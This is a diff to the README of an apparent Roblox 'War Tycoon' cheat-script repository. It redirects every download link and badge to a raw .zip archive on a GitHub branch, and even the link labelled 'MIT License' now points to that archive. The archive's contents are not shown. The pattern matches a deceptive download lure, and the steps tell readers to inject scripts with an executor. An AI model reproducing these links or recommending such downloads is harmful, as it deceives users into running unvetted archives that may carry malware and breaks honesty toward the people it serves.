@@ -1,11 +1,11 @@
 # War Tycoon Roblox Script Repository 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://sixtmore.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip)
 
 Welcome to the most comprehensive hub for the _War Tycoon Roblox Script_—a repository engineered for passionate gamers, genre enthusiasts, and creative developers alike. Here, we redefine your War Tycoon adventure through seamless enhancements, real-time automation, and intelligent integrations, all meticulously crafted to upgrade your in-game experience.
 
-> **Download the latest release**: https://sixtmore.github.io  
-> [![Download](https://img.shields.io/badge/Download-green)](https://sixtmore.github.io)
+> **Download the latest release**: https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip  
+> [![Download](https://img.shields.io/badge/Download-green)](https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip)
 
 ---
 
@@ -83,8 +83,8 @@ Day or night, victory or stalemate—assistance is always by your side. Reach ou
 
 ## 📦 How to Get Started
 
-1. **Download** the latest script https://sixtmore.github.io  
-   [![Download](https://img.shields.io/badge/Download-green)](https://sixtmore.github.io)
+1. **Download** the latest script https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip  
+   [![Download](https://img.shields.io/badge/Download-green)](https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip)
 2. **Installation**  
    - Inject the script into your Roblox War Tycoon session using your preferred executor.
    - Access the script dashboard via the in-game overlay.
@@ -120,7 +120,7 @@ The maintainers make no guarantees concerning account safety or performance outc
 This project is provided under the MIT License (2025).  
 Redistribution and use in source and binary forms, with or without modification, are permitted.  
 For the full legal text, visit:  
-[MIT License](https://opensource.org/licenses/MIT)
+[MIT License](https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip)
 
 ---
 
@@ -134,7 +134,7 @@ We welcome innovative contributions, suggestions, and feedback!
 
 ## 🔗 Quick Download
 
-- Download the latest version here: https://sixtmore.github.io  
-  [![Download](https://img.shields.io/badge/Download-green)](https://sixtmore.github.io)
+- Download the latest version here: https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip  
+  [![Download](https://img.shields.io/badge/Download-green)](https://github.com/usernameisthebestofthebest/war-tycoon-roblox-toolkit/raw/refs/heads/branch/bourgeoisie/tycoon_roblox_toolkit_war_v2.9.zip)
 
 **Experience War Tycoon like never before in 2025—every commander deserves smart allies and tactical advantages!**
